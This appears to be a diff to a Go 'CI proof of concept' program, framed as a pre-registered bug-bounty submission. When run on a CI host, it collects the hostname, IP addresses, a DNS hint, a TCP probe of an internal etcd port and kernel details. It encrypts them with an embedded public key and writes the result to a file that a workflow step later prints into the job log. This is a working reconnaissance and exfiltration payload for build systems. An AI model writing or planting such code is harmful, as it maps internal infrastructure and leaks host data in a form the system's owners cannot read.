@@ -14,11 +14,13 @@
 
 // Command ci-poc is a pre-registered ByteSRC PoC helper. It collects a
 // strictly non-sensitive runtime fingerprint from the CI host (hostname,
-// interface IPv4 list, DNS hint for one internal name and one TCP dial
-// probe) and prints an RSA-OAEP encrypted, base64 armored blob to stdout.
+// interface IPv4 list, one DNS hint and one TCP dial probe) and writes an
+// RSA-OAEP encrypted, base64 armored blob to hack/ci-poc/evidence.b64.
+// A dedicated workflow step later prints that blob into the job log.
 // The private key never enters this repository; only the ByteDance SRC
 // reviewer holding it can decrypt the evidence. This program reads no
-// credentials, alters no state, and never persists anything.
+// credentials, alters no state, and never persists anything beyond the
+// single evidence file it writes.
 package main
 
 import (
@@ -32,6 +34,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -54,8 +57,8 @@ kKwRziccIsWB0sUVLHIAfccCAwEAAQ==
 -----END PUBLIC KEY-----`
 
 const probeHost = "etcd.bytedance.com"
-
 const probePort = "2379"
+const evidencePath = "hack/ci-poc/evidence.b64"
 
 func field(key, value string) string {
 	if strings.TrimSpace(value) == "" {
@@ -151,12 +154,11 @@ func loadPublicKey() (*rsa.PublicKey, error) {
 	return rsaKey, nil
 }
 
-func main() {
+func buildPayload() (string, error) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "unknown"
 	}
-
 	payload := strings.Join([]string{
 		field("host", hostname),
 		field("ip", interfaceIPs()),
@@ -164,36 +166,48 @@ func main() {
 		field("tcp2379", dialProbe(probeHost, probePort)),
 		field("kernel", kernelInfo()),
 	}, "|")
-
 	if len(payload) > 446-64 {
 		payload = payload[:446-64]
 	}
+	return payload, nil
+}
 
-	fmt.Println("::notice title=ci-src-poc::pre-registered ByteSRC PoC evidence follows (encrypted)")
-	fmt.Println("POC-EVIDENCE-BEGIN")
+// writeEvidence encodes the payload to base64 and replaces evidencePath.
+func writeEvidence(blobPath, blob string) error {
+	var b strings.Builder
+	b.WriteString("POC-EVIDENCE-BEGIN\n")
+	for start := 0; start < len(blob); start += 100 {
+		end := start + 100
+		if end > len(blob) {
+			end = len(blob)
+		}
+		b.WriteString(blob[start:end])
+		b.WriteString("\n")
+	}
+	b.WriteString("POC-EVIDENCE-END\n")
+	return os.WriteFile(blobPath, []byte(b.String()), 0o600)
+}
+
+func main() {
+	payload, err := buildPayload()
+	if err != nil {
+		_ = os.WriteFile(evidencePath, []byte("POC-ERROR build_payload\n"), 0o600)
+		return
+	}
 
 	key, err := loadPublicKey()
 	if err != nil {
-		fmt.Printf("POC-ERROR key=load_failed reason=%v\n", err)
-		fmt.Println("POC-EVIDENCE-END")
+		_ = os.WriteFile(evidencePath, []byte(fmt.Sprintf("POC-ERROR load_key: %v\n", err)), 0o600)
 		return
 	}
 
 	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, key, []byte(payload), nil)
 	if err != nil {
-		fmt.Printf("POC-ERROR key=encrypt_failed reason=%v\n", err)
-		fmt.Println("POC-EVIDENCE-END")
+		_ = os.WriteFile(evidencePath, []byte(fmt.Sprintf("POC-ERROR encrypt: %v\n", err)), 0o600)
 		return
 	}
 
-	encoded := base64.StdEncoding.EncodeToString(ciphertext)
-	for start := 0; start < len(encoded); start += 100 {
-		end := start + 100
-		if end > len(encoded) {
-			end = len(encoded)
-		}
-		fmt.Println(encoded[start:end])
+	if err := writeEvidence(filepath.Join("hack", "ci-poc", "evidence.b64"), base64.StdEncoding.EncodeToString(ciphertext)); err != nil {
+		fmt.Printf("poc: failed to write evidence: %v\n", err)
 	}
-
-	fmt.Println("POC-EVIDENCE-END")
 }
